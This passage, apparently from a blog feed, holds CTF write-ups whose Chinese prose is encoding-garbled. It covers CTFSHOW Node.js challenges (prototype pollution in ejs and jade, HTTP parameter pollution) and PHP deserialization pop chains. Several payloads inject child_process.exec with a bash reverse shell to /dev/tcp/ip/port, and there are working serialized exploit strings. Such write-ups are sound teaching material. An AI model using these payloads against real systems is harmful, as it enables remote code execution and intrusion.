æ³¨å…¥ï¼Œåœ¨åé¢æ¨¡ç‰ˆæ¸²æŸ“çš„æ—¶å€™ï¼Œæ³¨å…¥ çš„ä»£ç è¢«æ‰§è¡Œ</li></ul><p>payloadï¼š</p><p><code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></p><p>æ“ä½œåŒä¸Šï¼Œåœ¨ç¯å¢ƒå˜é‡ä¸­æ‰¾åˆ°flagï¼š</p><p><img src="/img/CTFSHOW-Nodejs/341.png" alt=""></p><h1 id="web342-jadeåŸå‹é“¾æ±¡æŸ“"><a href="#web342-jadeåŸå‹é“¾æ±¡æŸ“" class="headerlink" title="web342(jadeåŸå‹é“¾æ±¡æŸ“)"></a>web342(jadeåŸå‹é“¾æ±¡æŸ“)</h1><p><a href="https://lonmar.cn/2021/02/22/å‡ ä¸ªnodeæ¨¡æ¿å¼•æ“çš„åŸå‹é“¾æ±¡æŸ“åˆ†æ/">å‡ ä¸ªnodeæ¨¡æ¿å¼•æ“çš„åŸå‹é“¾æ±¡æŸ“åˆ†æ | L0nm4r (lonmar.cn)</a></p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:</span><br><span class="line">&#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child</span><br><span class="line">_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ”¹<code>Content-Type: application/json</code></p><h1 id="web343-è¿‡æ»¤"><a href="#web343-è¿‡æ»¤" class="headerlink" title="web343(è¿‡æ»¤)"></a>web343(è¿‡æ»¤)</h1><p>é¢˜ç›®æè¿°è¯´342åŸºç¡€ä¸Šå¢åŠ äº†è¿‡æ»¤</p><p>ä½†æ˜¯payloadè¿˜æ˜¯ä¸å˜ï¼ŒåŒ342ã€‚</p><h1 id="web344-HTTPå‚æ•°æ±¡æŸ“"><a href="#web344-HTTPå‚æ•°æ±¡æŸ“" class="headerlink" title="web344(HTTPå‚æ•°æ±¡æŸ“)"></a>web344(HTTPå‚æ•°æ±¡æŸ“)</h1><p>ç›´æ¥ç»™äº†æºç ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">url</span>.<span class="title function_">match</span>(<span class="regexp">/8c|2c|\,/ig</span>))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">query</span>.<span class="property">query</span>);</span><br><span class="line">  <span class="keyword">if</span>(query.<span class="property">name</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;query.<span class="property">password</span>===<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.<span class="property">isVIP</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag. :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>if(query.name===&#39;admin&#39;&amp;&amp;query.password===&#39;ctfshow&#39;&amp;&amp;query.isVIP===true)</code>è¿›è¡Œäº†åˆ¤æ–­ï¼Œæ»¡è¶³æ¡ä»¶å°±è¿”å›flagã€‚</p><p><code>var query = JSON.parse(req.query.query)</code>è¡¨ç¤ºqueryå¯¹è±¡æ˜¯ç”±getè¯·æ±‚ä¼ å…¥çš„jsonå­—ç¬¦ä¸²</p><p>payloadï¼š<br><code>?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;</code></p><p>ä½†æ˜¯é¢˜ç›®è¿‡æ»¤äº†é€—å·å’Œ2cï¼ˆ%2cæ˜¯é€—å·çš„urlç¼–ç ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨&amp;æ›¿æ¢é€—å·ã€‚Nodejsä¸­ä¼šæŠŠè¿™ä¸‰éƒ¨åˆ†æ‹¼æ¥èµ·æ¥ã€‚</p><p><code>?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;ctfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</code></p><p>ä½†æ˜¯ä¼ å…¥payloadä¹‹åå´æ²¡æœ‰å›æ˜¾flag</p><p>å› ä¸ºåŒå¼•å·çš„urlç¼–ç æ˜¯%22å†å’Œcè¿æ¥èµ·æ¥å°±æ˜¯%22cï¼Œä¼šåŒ¹é…åˆ°æ­£åˆ™è¡¨è¾¾å¼ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬ä¼ å…¥çš„æ—¶å€™ï¼ŒæŠŠpayloadä¸­çš„cæ‰‹åŠ¨urlç¼–ç ä¸€æ¬¡ã€‚</p><p>æœ€ç»ˆpayloadï¼š</p><p><code>?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nodejs </tag>
            
            <tag> CTFSHOW </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPååºåˆ—åŒ– wp</title>
      <link href="/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20wp/"/>
      <url>/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20wp/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-pop"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-pop" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]pop"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]pop</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç å‘ç°ï¼Œè¦æƒ³è¾“å‡ºflagï¼Œéœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š</p><ul><li><p><code>$this-&gt;admin === &#39;w44m&#39; &amp;&amp; $this-&gt;passwd ===&#39;08067&#39;</code></p></li><li><p>è°ƒç”¨<code>Getflag</code>æ–¹æ³•</p></li></ul><p>å‘ç°<code>w33m</code>ç±»ä¸­å¯ä»¥é€šè¿‡<code>__toString()</code>é­”æœ¯æ–¹æ³•é—´æ¥è°ƒç”¨<code>Getflag()</code>æ–¹æ³•ï¼Œè€Œæƒ³è¦è§¦å‘<code>__toString()</code>æ–¹æ³•ï¼Œåˆ™éœ€è¦åˆ©ç”¨<code>w22m</code>ä¸­çš„<code>__destruct()</code>æ–¹æ³•ï¼Œè‡³æ­¤popé“¾å°±å‡ºæ¥äº†</p><p><code>w22m-&gt;w33m-&gt;w44m</code></p><p>æ„é€ paylaodï¼š<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class w44m&#123;</span><br><span class="line">    private $admin = &#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd = &#x27;08067&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">&#125;</span><br><span class="line">$w22 = new w22m();</span><br><span class="line">$w33 = new w33m();</span><br><span class="line">$w44 = new w44m();</span><br><span class="line">$w22-&gt;w00m = $w33;</span><br><span class="line">$w33-&gt;w00m = $w44;</span><br><span class="line">$w33-&gt;w22m = &#x27;Getflag&#x27;;</span><br><span class="line"></span><br><span class="line">echo serialize($w22);</span><br><span class="line"></span><br><span class="line">// O:4:&quot;w22m&quot;:1:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;s:11:&quot; w44m admin&quot;;s:4:&quot;w44m&quot;;s:9:&quot; * passwd&quot;;s:5:&quot;08067&quot;;&#125;s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;</span><br><span class="line">// å°†ä¸Šè¿°å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦åŒ–æˆ%00</span><br></pre></td></tr></table></figure></p><p>æœ€ç»ˆpayloadï¼š</p><p><code>?w00m=O:4:&quot;w22m&quot;:1:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;s:11:&quot;%00w44m%00admin&quot;;s:4:&quot;w44m&quot;;s:9:&quot;%00*%00passwd&quot;;s:5:&quot;08067&quot;;&#125;s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;</code></p><h1 id="HUBUCTF-2022-æ–°ç”Ÿèµ›-checkin"><a href="#HUBUCTF-2022-æ–°ç”Ÿèµ›-checkin" class="headerlink" title="[HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin"></a>[HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$username</span>  = <span class="string">&quot;this_is_secret&quot;</span>; </span><br><span class="line"><span class="variable">$password</span>  = <span class="string">&quot;this_is_not_known_to_you&quot;</span>; </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//here I changed those two </span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"><span class="variable">$data_unserialize</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$info</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data_unserialize</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$username</span>&amp;&amp;<span class="variable">$data_unserialize</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;username or password error!&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">username <span class="keyword">or</span> password error!</span><br></pre></td></tr></table></figure><p>é¢˜ç›®è¦æ±‚GETä¼ å…¥ä¸€ä¸ªinfoï¼Œå¹¶å¯¹infoåšååºåˆ—åŒ–ï¼Œä½¿å¾—ååºåˆ—åŒ–åçš„æ•°ç»„ä¸­ï¼Œå¯¹åº”çš„<code>$data_unserialize[&#39;username&#39;]==$username&amp;&amp;$data_unserialize[&#39;password&#39;]==$password</code></p><p><strong>æ³¨æ„ï¼šç¬¬äº”è¡Œæ³¨é‡Šæç¤ºæ”¹å˜äº†ä¸¤ä¸ªå˜é‡çš„å€¼ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œå¼±æ¯”è¾ƒç»•è¿‡</strong></p><p>æ„é€ payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;username&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>=&gt;<span class="number">0</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$info</span>);</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆpayloadï¼š</p><p><code>?info=a:2:&#123;s:8:&quot;username&quot;;i:0;s:8:&quot;password&quot;;i:0;&#125;</code></p><h1 id="UUCTF-2022-æ–°ç”Ÿèµ›-ezpop"><a href="#UUCTF-2022-æ–°ç”Ÿèµ›-ezpop" class="headerlink" title="[UUCTF 2022 æ–°ç”Ÿèµ›]ezpop"></a>[UUCTF 2022 æ–°ç”Ÿèµ›]ezpop</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UUCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>,<span class="variable">$key</span>,<span class="variable">$basedata</span>,<span class="variable">$ob</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key===<span class="string">&quot;UUCTF&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ob=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;basedata));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;oh!you should learn PHP unserialize String escape!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">rce</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;t;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pdata</span>=<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$pdata</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">UUCTF</span>(<span class="variable">$pdata</span>));</span><br><span class="line">    <span class="variable">$data_replace</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;hacker&quot;</span>,<span class="string">&quot;loveuu!&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data_replace</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ä»£ç ï¼Œå‘ç°ååºåˆ—åŒ–çš„æ¡ä»¶æ˜¯å…ˆè¿›è¡Œå­—ç¬¦ä¸²æ›¿æ¢ï¼Œå†ååºåˆ—åŒ–ï¼Œä¸éš¾çœ‹å‡ºï¼Œè¿™é‡Œå¯ä»¥è¿›è¡Œå­—ç¬¦ä¸²é€ƒé€¸ï¼Œè€Œä¸”è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„å­—ç¬¦ä¸²å¢åŠ </p><p>å…ˆæ¢³ç†ä¸€ä¸‹è°ƒç”¨é¡ºåº</p><ul><li>åœ¨<code>youwant</code>ç±»ä¸­å­˜åœ¨ä»»æ„å‘½ä»¤æ‰§è¡Œçš„æ¡ä»¶</li><li>åœ¨<code>output</code>ç±»ä¸­å‘ç°å¯ä»¥åˆ©ç”¨<code>__toString()</code>é­”æœ¯æ–¹æ³•æ¥é—´æ¥è°ƒç”¨<code>youwant</code>ç±»ä¸­çš„<code>rce()</code>å‡½æ•°</li><li>å¯ä»¥é€šè¿‡<code>nothing</code>ç±»ä¸­çš„<code>__destruct()</code>é­”æœ¯æ–¹æ³•é‡Œé¢çš„<code>die()</code>å‡½æ•°è§¦å‘<code>__toString()</code>æ–¹æ³•</li></ul><p>è‡³æ­¤ï¼Œè°ƒç”¨é¡ºåºå°±å‡ºæ¥äº†ï¼š</p><p><code>nothing-&gt;output-&gt;youwant</code></p><p>è¿˜æœ‰å‡ ä¸ªé—®é¢˜éœ€è¦æˆ‘ä»¬è§£å†³ï¼š</p><ol><li>å¦‚ä½•è§¦å‘<code>nothing</code>ç±»ä¸­çš„<code>__destruct()</code>é­”æœ¯æ–¹æ³•ï¼Ÿ</li><li>åœ¨<code>nothing</code>ç±»ä¸­ï¼Œå¦‚ä½•é¿å…<code>a</code>å˜é‡è¢«<code>__wakeup()</code>é­”æœ¯æ–¹æ³•æ›¿æ¢ä¸ºç©ºï¼Ÿ</li><li>åˆè¯¥æ€ä¹ˆåˆ©ç”¨å­—ç¬¦ä¸²é€ƒé€¸å‘¢ï¼Ÿ</li></ol><p>è§£å†³æ–¹æ¡ˆï¼š</p><ol><li>åœ¨<code>UUCTF</code>ç±»ä¸­å½“<code>key=&quot;UUCTF&quot;</code>æ—¶ï¼Œå¯ä»¥è¿›è¡Œä¸€æ¬¡ååºåˆ—åŒ–æ“ä½œï¼Œè¿›è€Œè§¦å‘<code>__destruct()</code></li><li>å¯ä»¥åˆ©ç”¨å¼•ç”¨ï¼Œé€šè¿‡å¼•ç”¨å˜é‡<code>a</code>å’Œ<code>b</code>ï¼Œå½“èµ‹å€¼ç»™<code>t</code>çš„æ—¶å€™å°±å¯ä»¥ç»™<code>a</code>èµ‹å€¼äº†</li><li>ä½¿<code>key=&quot;UUCTF&quot;</code>æ—¶ä»¥åŠç»™<code>basedata</code>èµ‹å€¼æ—¶ï¼Œå¯ä»¥åˆ©ç”¨å­—ç¬¦ä¸²é€ƒé€¸</li></ol><p>æœ€ç»ˆè°ƒç”¨é¡ºåºï¼š</p><p><code>UUCTF-&gt;nothing-&gt;output-&gt;youwant</code></p><p>æ„é€ payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$out</span> = <span class="keyword">new</span> <span class="title function_ invoke__">output</span>();</span><br><span class="line"><span class="variable">$no</span> = <span class="keyword">new</span> <span class="title function_ invoke__">nothing</span>();</span><br><span class="line"><span class="variable">$you</span> = <span class="keyword">new</span> <span class="title function_ invoke__">youwant</span>();</span><br><span class="line"><span class="variable">$no</span>-&gt;a =&amp; <span class="variable">$no</span>-&gt;b;</span><br><span class="line"><span class="variable">$no</span>-&gt;t = <span class="variable">$out</span>;</span><br><span class="line"><span class="variable">$out</span>-&gt;a = <span class="variable">$you</span>;</span><br><span class="line"><span class="variable">$you</span>-&gt;cmd = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$no</span>));<span class="comment">// basedataæ•°æ®éœ€è¦é€ƒé€¸çš„å†…å®¹</span></span><br><span 